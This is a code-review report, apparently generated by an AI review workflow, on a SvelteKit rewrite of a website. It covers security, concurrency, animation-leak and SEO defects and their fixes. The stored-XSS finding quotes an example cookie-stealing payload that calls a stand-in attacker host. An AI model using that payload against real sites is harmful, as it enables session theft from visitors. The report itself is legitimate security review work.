# orch-review Report — Performance Re-Architecture (Next.js 16 → SvelteKit 2)

> **Gate 2 code review** of the SvelteKit rewrite that implements
> `.claude/PRPs/prds/performance-rearchitecture-sveltekit.prd.md`.
> Multi-dimension review + adversarial verification across the merged
> Phase 0–5 codebase on `main`.

| | |
| --- | --- |
| **Date** | 2026-08-28 |
| **Reviewed** | PRs #11–#23 (Phase 0–5), merged to `main`; SvelteKit promoted to repo root, Next.js decommissioned |
| **Method** | `orch-review` native workflow — 8 slices × per-dimension reviewers, dedup, 2-skeptic adversarial verify (fail-closed) |
| **Verdict** | **`CHANGES_REQUESTED`** |
| **Findings** | **11 blocking** (all HIGH, all confirmed) · **46 advisory** |
| **Agents** | 44 (21 reviewers + verifiers + synthesis) · 0 errors · ~28 min · ~2.83M subagent tokens |
| **Dimensions failed** | 0 (review is complete — not a fail-closed partial) |

---

## 1. Methodology

The merged rewrite (Next.js deleted; code lives on disk, not an unapplied diff) was
partitioned into **8 disjoint review slices**. Each slice was reviewed in parallel by the
relevant ECC reviewer agents — **quality** (`code-reviewer`), **language** (`typescript-reviewer`),
**security** (`security-reviewer`, on the 4 sensitive slices), and **database**
(`database-reviewer`, on the schema/migration slice). Every reviewer **read the real files
from disk** and additionally checked the implementation against the **PRD's own claims** for
that slice (category `spec-conformance`).

Findings were deduped within-slice on the normalized evidence snippet. Every unique
**CRITICAL/HIGH** finding was then **adversarially verified by 2 independent skeptics**
(one prompted to *refute*, one with an *impact-trace* lens). A blocker is demoted to advisory
**only if both skeptics confidently refute it** (`isReal=false`, confidence ≥ 0.8); anything
uncertain or unverifiable **stays blocking** (fail-closed). All 11 blockers below survived
that gate as `confirmed`; **0 were refuted**, and the human reviewer independently re-read the
6 most severe findings against source (rate-limit, email-send race, popup XSS, email
normalization, both redirect stubs) — all corroborated.

### Slice coverage

| Slice | Files | Dimensions | unique | blocking |
| --- | --- | --- | --- | --- |
| `auth` — Better Auth, session guard, login | 7 | quality, ts, security | 4 | **0** ✅ |
| `public-api` — subscribe/contact/popups-active, rate-limit, CSRF | 6 | quality, ts, security | 11 | 1 |
| `admin-api` — admin CRUD, email send, mail, popup-cache | 7 | quality, ts, security | 7 | 2 |
| `arch-data` — vite/hooks/prerender, prisma, migrations, sitemap | 11 | quality, ts, security, database | 8 | 1 |
| `motion-3d` — Threlte, GSAP, CSS scroll-timeline, inview | 13 | quality, ts | 7 | 3 |
| `shell-seo` — layout, SEO, media, forms, popup | 12 | quality, ts | 10 | **0** ✅ |
| `content` — about/home/program components, data | 24 | quality, ts | 6 | 3 |
| `admin-ui` — admin panel pages | 5 | quality, ts | 4 | 1 |

---

## 2. Executive Summary

The **performance architecture the PRD's hypothesis rests on is structurally intact** — no
finding contradicts the core mechanisms: URL-based Paraglide i18n with **no request-time
cookie/header read**, `prerender = true` content routes, the enhanced-img AVIF/WebP pipeline,
framer-motion dropped for Svelte-native motion + lazy GSAP, and Threlte for the one 3D scene.

However, **this is a static review — none of the PRD's success metrics were measured**
(Lighthouse ≥ 95, LCP < 2 s, first-load JS ≤ 70 KB, 0 CJK bytes on English pages, edge-cache
HITs). The thesis is **plausible-but-unproven**; the PRD's own pre-cutover baselines remain TBD.

The **11 blocking defects cluster exactly where the PRD flagged the highest regression risk** —
the **admin/auth port** and the **motion/3D layer** — rather than in the performance spine. The
single most dangerous is an **email-normalization bug** that locks every migrated admin out of
login and, if shipped, defeats the entire Phase-5 cutover. Alongside it sit two user-facing
correctness/security holes (**stored XSS** via popup `buttonLink`, and a **send-status race**
that can blast the campaign to all subscribers twice) plus a cluster of **WebGL/GSAP resource
leaks** that erode the very 60 fps / on-demand-render promise the rewrite exists to deliver. A
pervasive **hardcoded-English-string regression** across many components violates the PRD's
non-negotiable "every user-facing string through Paraglide" bilingual constraint.

Encouragingly, the **`auth` core structure and the `shell-seo` shell each carry 0 blocking
findings**, and **most blockers are one-to-a-few-line fixes**.

---

## 3. Blocking Findings (11) — must clear before commit/cutover

All are severity **HIGH**, status **confirmed** by both adversarial verifiers.

### A. Security & data correctness

#### B1 — Backfill migration email not lowercased → migrated admins locked out
- **File**: `prisma/migrations/20260827140000_backfill_admins_to_betterauth/migration.sql:15`
- **Also duplicated in**: `prisma/migrate-admins-to-betterauth.ts:17`, `prisma/seed.ts:8` (see advisory)
- **Proof**: The migration copies `admin_users.email` verbatim (no `LOWER()`) into `user.email`.
  Better Auth sign-in always looks up `email.toLowerCase()`
  (`node_modules/better-auth/dist/db/internal-adapter.mjs` `findUserByEmail` → exact match, no
  case-insensitive mode), and `user.email` is a plain case-sensitive `varchar` (no `citext`).
  Any admin whose stored email has an uppercase character (e.g. `Admin@IthacaFA.org`) can
  **never log in**, silently voiding the whole admin/auth port and the Phase-5 verify-login gate.
- **⏰ Timing**: The migration auto-runs via `prisma migrate deploy` on the **next `-kit` prod
  rollout and has not yet run in prod** — fixing now avoids the lockout entirely.
- **Fix**: `SELECT ..., LOWER(a."email"), ...` on insert; change the account-backfill join
  `JOIN "user" u ON u."email" = a."email"` → `ON u."id" = a."id"` (the id is already reused
  verbatim, sidestepping casing). Apply the same `.toLowerCase()` in the `.ts` mirror and seed.

#### B2 — Popup `buttonLink` accepts `javascript:`/`data:` → stored XSS to every visitor
- **File**: `src/routes/api/admin/popups/+server.ts:19` (and `:59` for update)
- **Sink**: `src/lib/components/PopupBanner.svelte:78` renders `<a href={popup.buttonLink}>`
- **Proof**: Validation is only `z.string().url()`; zod@4.4.3 accepts `javascript:alert(1)` and
  `data:text/html,...` (the WHATWG parser validates *parseability*, not scheme). Svelte does not
  block dangerous URL schemes in attribute bindings. A `POST`/`PUT` with
  `buttonLink: "javascript:fetch('//evil/c?'+document.cookie)"` passes validation, is stored,
  and executes in **every visitor's browser** who clicks the popup CTA (persistent, site-wide XSS —
  not self-XSS).
- **Fix**: `.refine(u => /^https?:\/\//i.test(u), 'Must be an http(s) URL')` on **both** create
  and update schemas.

#### B3 — Campaign send has no atomic guard → duplicate mass-email blast
- **File**: `src/routes/api/admin/emails/send/+server.ts:26`
- **Proof**: The "already sent" guard is a non-atomic read-then-write: `findUnique` reads status,
  checks `!== 'sent'`, then a separate `update` sets `'sending'`. Two concurrent `POST`s for the
  same campaign id (double-click, two tabs, `curl` twice, client retry after a slow response)
  both pass the check and both loop every active subscriber → **every subscriber receives the
  campaign twice**. Irreversible; damages deliverability/reputation. The admin UI only disables
  the button client-side per-tab.
- **Fix**: Atomic claim — `updateMany({ where: { id, status: { notIn: ['sending','sent'] } },
  data: { status: 'sending' } })` and abort with 409 if `count !== 1` (or `$transaction` +
  row lock).

#### B4 — Unguarded `event.getClientAddress()` escapes the API error envelope
- **File**: `src/lib/server/rate-limit.ts:74`
- **Proof**: The Dockerfile bakes `ADDRESS_HEADER=cf-connecting-ip` unconditionally.
  adapter-node's `getClientAddress()` **synchronously throws** when that header is absent
  (health checks, LB probes, a direct hit on `:3000`, a Cloudflare hiccup). Both callers
  `await rateLimit(...)` **before** their own `try/catch`
  (`src/routes/api/subscribe/+server.ts:34`, `src/routes/api/contact/+server.ts:39`), and there
  is **no `handleError` hook**, so SvelteKit's default error path returns a generic body — **not**
  the `{success, data?, error?}` `ApiResponse` envelope — on the public conversion path.
- **Fix**: Wrap `getClientAddress()` in `try/catch` inside `rateLimit()`; fail safe (constant
  fallback key or a JSON `ApiResponse`) instead of letting it propagate.

### B. Animation / 3D resource leaks (trigger: live reduced-motion toggle or remount)

#### B5 — Particle `BufferGeometry`/`PointsMaterial` never disposed → WebGL leak
- **File**: `src/lib/components/programs/ev-challenge/EVSceneContents.svelte:31`
- **Proof**: Threlte's auto-disposal only tracks objects where `typeof object.dispose ===
  'function'`. `THREE.Points` has no `.dispose()` of its own (`three/src/objects/Points.js`) — so
  `<T is={particles}>` is never registered for disposal. Sibling `FatLine.svelte:66-69` works
  around the identical limitation with an explicit `onDestroy` dispose; this file has none.
  `prefersReducedMotion` is a **live** `MediaQuery`; toggling OS "reduce motion" while the page
  is open remounts the subtree, allocating fresh GPU buffers each time without releasing the old
  ones (three.js requires explicit `.dispose()` to free GPU-side WebGL resources).
- **Fix**: `onDestroy(() => { particleGeometry.dispose(); particleMaterial.dispose(); })`.

#### B6 — GSAP ScrollTrigger/pin not reverted on live reduced-motion change → orphaned blank block
- **File**: `src/lib/components/programs/ev-challenge/EVModel3DSection.svelte:166`
- **Proof**: `prefersReducedMotion` (svelte/motion `MediaQuery`) drives the template branch, but
  `ctx.revert()` only runs in the `onMount` destroy cleanup (route navigation), never on the
  reactive branch swap. GSAP `pin:true` wrapped `sectionEl` in a `.pin-spacer` sized for 400%
  scroll height; when Svelte removes the `<section>` on the branch swap, the GSAP-inserted
  `.pin-spacer` (outside Svelte's tracked DOM) is **left behind as a multi-viewport blank gap**,
  and the still-alive ScrollTrigger keeps firing against detached nodes.
- **Fix**: Make `ctx?.revert()` reactive to `prefersReducedMotion.current` (an `$effect` that
  reverts + nulls `ctx` on flip), or split animated/static into child components with their own
  `onDestroy`.

#### B7 — Same reduced-motion branch-swap leak in the scrub section
- **File**: `src/lib/components/programs/ev-challenge/WorkshopToRoles.svelte:210`
- **Proof**: Identical pattern — `outerEl` is bound only inside the `{:else}` branch, and the
  `scrub: 2.5` ScrollTrigger is reverted only on component destroy. Toggling the OS setting
  mid-session unmounts `outerEl`/`.wtr-photo`/`.wtr-card` while the scrubbed timeline keeps
  animating the detached nodes on every scroll event.
- **Fix**: Revert `initCtx`/`scrollCtx` reactively when `prefersReducedMotion.current` becomes true.

#### B8 — Floating `loadGsap()` promise permanently poisons the shared loader
- **File**: `src/lib/components/home/StudentHighlights.svelte:97`
- **Proof**: `loadGsap().then()` has no `.catch()`. `gsap.ts` memoizes the loader in a
  module-level `cached` promise that is **not reset on rejection**, so a single dynamic-import
  failure (stale chunk hash 404 after redeploy, ad-blocker, flaky mobile network) becomes an
  unhandled rejection **and** silently breaks GSAP for **every** other consumer for the rest of
  the session (ev-challenge, CinematicDivider).
- **Fix**: Add `.catch(err => console.error(...))`; the static `overflow-x-auto` fallback already
  exists, so no behavioral redesign is needed — just stop the rejection from going unhandled.

### C. SEO / functional parity

#### B9 & B10 — Prerendered redirect stubs serve `200 + meta-refresh` instead of a real `308`
- **Files**: `src/routes/programs/elite-interview/+page.ts:6`,
  `src/routes/programs/ai-pioneers-interview/+page.ts:6`
- **Proof**: `export const prerender = true` (also cascaded from `+layout.ts:3`) + `redirect(308)`
  in `load`. SvelteKit prerendering a redirect writes a static file containing only
  `<script>location.href=…</script><meta http-equiv="refresh">` and never re-runs `load` at
  request time on adapter-node (`serve_prerendered` in
  `@sveltejs/adapter-node/files/handler.js` serves it from disk with a default `200`). `curl` /
  SEO tools / social unfurlers that don't execute JS get **`200 OK` + near-empty body** instead
  of `308` + `Location`, breaking the PRD's "preserve English URLs for SEO" constraint and losing
  link equity.
- **Fix**: `export const prerender = false;` on both stubs so `load` runs per-request and emits a
  genuine `308`.

#### B11 — Popup `buttonText`/`buttonLink` can never be cleared via the edit form
- **File**: `src/routes/admin/(protected)/popups/+page.svelte:105`
- **Proof**: `JSON.stringify()` drops `undefined`-valued keys. Clearing the inputs makes
  `buttonText || undefined` / `buttonLink || undefined` evaluate to `undefined`, so the keys are
  **absent** from the `PUT` body; the server treats absent as "keep existing"
  (`if (updateFields.buttonText !== undefined) …`), so the old value persists while the response
  is `success: true`. (Contrast `startDate`/`endDate`, which correctly send `null`.) A
  stale/broken CTA link renders on the public site indefinitely, breaking "popup CRUD" parity.
- **Fix**: Send `null` (not `undefined`) on intentional clear; have the `PUT` handler null the
  column on explicit `null` (distinguish "omitted" from "cleared").

---

## 4. Advisory Findings (46) — by theme

Not blocking, but recommended. `file:line — title`.

### i18n: hardcoded English strings bypass Paraglide (systemic, cross-slice)
- `src/lib/components/Seo.svelte:7` — hardcoded English brand suffix on every title, incl. zh pages *(MED)*
- `src/lib/components/NewsletterForm.svelte:62` — subscribe button text hardcoded English *(MED)*
- `src/lib/components/layout/Header.svelte:242` — several interactive aria-labels hardcoded English *(MED/LOW)*
- `src/lib/components/home/FeaturedSection.svelte:44` — hardcoded aria-labels / iframe title *(MED)*
- `src/lib/components/home/ContactSection.svelte:52` — several a11y strings hardcoded English *(MED)*
- `src/lib/components/home/CinematicDivider.svelte:93` — hardcoded non-localized aria-label *(MED)*
- `src/lib/components/programs/ev-challenge/EVModel3DSection.svelte:46` — hardcoded English-only strings *(MED)*

### Error handling: leaks internals / swallows failures
- `src/routes/api/subscribe/+server.ts:72` — raw exception messages returned to clients, no server log *(MED)*
- `src/routes/api/contact/+server.ts:80` — raw exception messages returned (contact) *(MED)*
- `src/routes/api/admin/emails/send/+server.ts:71` — silent catch swallows SMTP failure, no logging *(MED)*
- `src/hooks.server.ts:37` — `getSession()` failures silently swallowed → outages masked as logouts *(MED)*

### Concurrency / TOCTOU
- `src/routes/api/subscribe/+server.ts:49` — TOCTOU on unique `Subscriber.email` → raw 500 instead of 409 *(MED)*
- `src/routes/api/contact/+server.ts:58` — same TOCTOU in the contact opt-in path + raw error leak *(MED)*
- `src/routes/api/admin/emails/send/+server.ts:32` — no atomic guard vs concurrent/duplicate send *(MED)* *(same root as B3)*
- `src/routes/api/admin/emails/send/+server.ts:54` — retry resends to ALL subscribers (duplicates already-sent) *(MED)*
- `src/routes/api/subscribe/+server.ts:65` — subscriber committed before `sendMail` → misleading 500 on mail failure *(MED)*
- `src/routes/api/contact/+server.ts:55` — DB-write-before-mail ordering can duplicate `ContactMessage` on retry *(LOW)*

### Input validation
- `src/routes/admin/(protected)/subscribers/+page.svelte:63,70` — CSV/formula injection in export (CWE-1236) via `name` *(MED)*
- `src/routes/api/contact/+server.ts:15` — no max-length bound on name/phone/message *(LOW)*
- `src/routes/api/admin/subscribers/+server.ts:11` — non-numeric `page`/`limit` → NaN → Prisma error escapes envelope *(MED)*

### Accessibility polish
- `src/lib/components/PopupBanner.svelte:17` — focus-move/restore only, not a full focus trap (PRD asks for trap) *(MED/LOW)*
- `src/lib/components/layout/Header.svelte:245` — hamburger/X is a hard icon swap, not an animated morph *(LOW)*
- `src/routes/+error.svelte:10` — never sets `<title>`/description; shows "404" copy for all errors *(MED)*

### Database schema
- `prisma/schema.prisma:101` — `Session.userId` / `Account.userId` FK columns have no index *(MED)*
- `prisma/schema.prisma:95` — all `DateTime` map to `TIMESTAMP(3)` (no tz) instead of `timestamptz` *(MED)*

### Auth defense-in-depth
- `src/lib/server/auth.ts:37` — hardcoded localhost origins unconditionally trusted in production *(LOW)*
- `src/lib/server/auth.ts:11` — Better Auth built-in sign-in rate limiter not told to trust `cf-connecting-ip` *(MED)*
- `src/routes/admin/login/+page.svelte:30` — `callbackUrl` passed to `goto()` with a comment claiming "validated" — none exists *(LOW)*

### Email-normalization duplication (same root cause as B1)
- `prisma/migrate-admins-to-betterauth.ts:17` — TS mirror has the same unnormalized-email bug *(MED)*
- `prisma/seed.ts:8` — seed stores `ADMIN_EMAIL` verbatim → risks immediate lockout of the seeded admin *(MED)*

### CSRF / misc
- `src/lib/server/csrf.ts:30` — localhost/127.0.0.1 Origin bypass is unconditional, incl. production *(LOW ×2)*
- `src/lib/server/csrf.ts:8` — stale comment claims double-submit CSRF is dropped, but code implements it and both routes rely on it *(LOW)*
- `src/lib/server/mail.ts:39` — `sendMailBatch` loops fully sequentially, so `BATCH_SIZE` grouping gives no throughput benefit *(LOW)*
- `src/routes/admin/(protected)/subscribers/+page.svelte:55` — deleting the last subscriber on the last page strands a false "no subscribers" screen *(MED)*
- `src/hooks.ts:6` — `reroute()` param misleadingly named `request` (not a Fetch Request) *(LOW)*
- `src/routes/sitemap.xml/+server.ts:11` — hand-maintained `PATHS` list will silently omit new routes *(LOW)*
- `vite.config.ts:54` — stale comment referencing "Phase 3" form actions that already shipped *(LOW)*
- `src/lib/data/team.ts:19` — `TeamMember.image` field is dead data *(LOW)*
- `src/lib/components/shared/Reveal.svelte:38` — `once={false}` path unimplemented (`onoutview` never resets `shown`) *(LOW)*
- `src/routes/+layout.svelte:77` — duplicate/conflicting `og:image` (layout default + per-page `<Seo>`) *(MED)*

---

## 5. Cross-Cutting Themes

1. **i18n bypass is the most repeated defect** — hardcoded English strings, aria-labels, and
   iframe titles span at least four slices. This is systemic, not isolated misses; a message-key
   sweep of all ported components is warranted.
2. **Live `prefers-reduced-motion` changes are not handled** — GSAP ScrollTriggers/pins are set up
   but never reverted on the media-query flip (B6, B7), orphaning detached nodes and blank blocks.
   The branch-swap teardown path is the recurring gap.
3. **Resource/lifecycle disposal is missing on the heavy render path** — WebGL geometry/material
   and GSAP triggers created without `onDestroy` cleanup (B5–B7), a memory-leak pattern specific
   to the motion/3D layer.
4. **Error handling both leaks and hides** — raw exception messages returned to clients with no
   server-side logging, and `getSession()`/SMTP failures silently swallowed — the same
   "catch, drop, reveal internals" anti-pattern across auth, public-api, and admin-api.
5. **Unguarded concurrency on unique/state fields** — TOCTOU on `Subscriber.email` and the
   campaign send-status race are the same "read-check-then-write without atomicity" shape.
6. **Untrusted input reaches sinks without scheme/format/length bounds** — popup `buttonLink`
   (XSS), CSV/formula injection in export, missing max-length on contact fields.
7. **The email-normalization bug is itself a cross-cutting duplication** — the identical defect
   appears in `migration.sql`, `migrate-admins-to-betterauth.ts`, and `seed.ts` (one root, three copies).

---

## 6. Coverage Gaps (this static review could NOT confirm)

- **Runtime performance metrics** — the entire PRD hypothesis is unverified: no Lighthouse score,
  mobile LCP (< 2.0 s / 4G), CLS (< 0.05), or INP (< 200 ms) was measured, and the PRD's own
  pre-cutover baselines are still TBD → deltas cannot be proven.
- **Bundle-size targets** — first-load JS ≤ 70 KB gzipped and the reduced 3D chunk were not
  measured against a bundle analyzer.
- **0 CJK bytes on English pages** — claimed verified in the Phase-1 report but not re-confirmed
  here; needs a per-locale network trace.
- **Live Cloudflare cache behavior** — whether "Cache Everything" is scoped to public paths only
  (admin/API excluded, no cross-user poisoning), whether content routes return
  `Cf-Cache-Status: HIT`, and whether `_data.json` soft-nav requests are edge-cached — all infra,
  invisible to code review.
- **Actual prod admin login** — the B1 email-normalization lockout only manifests against real
  migrated `AdminUser` data with mixed-case emails; the Phase-5 verify-login gate must be
  exercised against production data **before** the `admin_users` DROP.
- **Whether the identified races actually fire** — the campaign-send and `Subscriber.email` TOCTOU
  windows are real in code but their frequency depends on real concurrent load.

---

## 7. Recommended Remediation Order

Most blockers are low-cost (one-liners) except the motion/3D revert work (B5–B7, moderate).

1. **B1** — `LOWER()` the email in migration + `.ts` mirror + seed. **⏰ Land before the next
   prod `-kit` rollout** (the migration auto-runs and the backfill has not yet run in prod).
2. **B2** — restrict popup `buttonLink` scheme to `http(s)`.
3. **B3** — atomic campaign-send claim (`updateMany` guard).
4. **B4** — guard `getClientAddress()` in `rateLimit()`.
5. **B9/B10** — `prerender = false` on both redirect stubs.
6. **B8** — add `.catch()` to the `loadGsap()` call.
7. **B11** — send `null` (not `undefined`) to clear popup fields.
8. **B5/B6/B7** — `onDestroy` dispose + reactive `revert()` on the reduced-motion branch swap.

Then triage the high-value advisories: the **i18n message-key sweep**, **error-handling**
(log + don't leak internals), **DB FK indexes + `timestamptz`**, and **CSV-injection** in the
subscriber export.

The **`auth` core structure and the `shell-seo` shell carry 0 blocking findings** — they are the
solid parts of the rewrite.

---

## 8. Appendix — Stats

```
verdict           CHANGES_REQUESTED
incomplete        false          (all 8 slices × all dimensions ran)
slices            8
reviewerAgents    21
blocking          11   (11 HIGH · 11 confirmed · 0 refuted · 0 unverified · 0 uncertain)
advisory          46
failedDimensions  0
agents            44   (0 errors) · ~2.83M subagent tokens · ~28 min
```

*Generated by the `orch-review` workflow (ECC) — Gate 2 review artifact.*
*Source PRD: `.claude/PRPs/prds/performance-rearchitecture-sveltekit.prd.md`*
